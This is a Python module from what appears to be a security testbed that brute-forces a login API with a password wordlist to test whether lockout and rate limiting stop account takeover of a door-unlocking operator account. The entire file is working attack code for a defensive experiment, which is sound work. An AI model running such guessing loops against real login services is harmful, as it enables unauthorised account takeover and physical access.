"""
module1_attacks/brute_force.py - Online password guessing against the cloud login.

Story: the attacker knows the username "operator1" (operators can unlock
doors) and tries every password in a list of common passwords against
POST /api/login until one works.

Measured: did the attacker obtain a valid login token?
    success_rate_pct = 100 if the account was taken over, else 0.
    attempts         = number of passwords tried.
Expected defence in secure mode: account lockout + login rate limiting
(+ bcrypt, which makes offline cracking of stolen hashes slow).
"""

import os
from collections import Counter

from core.http_util import http_json
from module1_attacks.common import make_result

TARGET_USER = "operator1"
WORDLIST = os.path.join(os.path.dirname(os.path.abspath(__file__)), "wordlist.txt")


def load_wordlist(path=WORDLIST):
    """Read one password per line, skipping blanks and comments."""
    with open(path, encoding="utf-8") as handle:
        return [line.strip() for line in handle if line.strip() and not line.startswith("#")]


def run(building):
    """Try every password in the wordlist until a token comes back."""
    url = f"{building.api_url}/api/login"
    statuses = Counter()
    cracked_with = None
    attempts = 0
    for password in load_wordlist():
        attempts += 1
        status, body = http_json("POST", url, {"username": TARGET_USER, "password": password})
        statuses[status] += 1
        if status == 200 and body.get("token"):
            cracked_with = attempts
            break

    replies = ", ".join(f"HTTP {code} x{count}" for code, count in sorted(statuses.items()))
    if cracked_with:
        evidence = f"token obtained for {TARGET_USER} after {cracked_with} guesses ({replies})"
        defence = ""
    else:
        evidence = f"{attempts} guesses, no token ({replies})"
        defence = "login refused: " + replies
    return make_result("brute_force", building.mode, attempts, 1 if cracked_with else 0,
                       defence, evidence, rate=100.0 if cracked_with else 0.0)
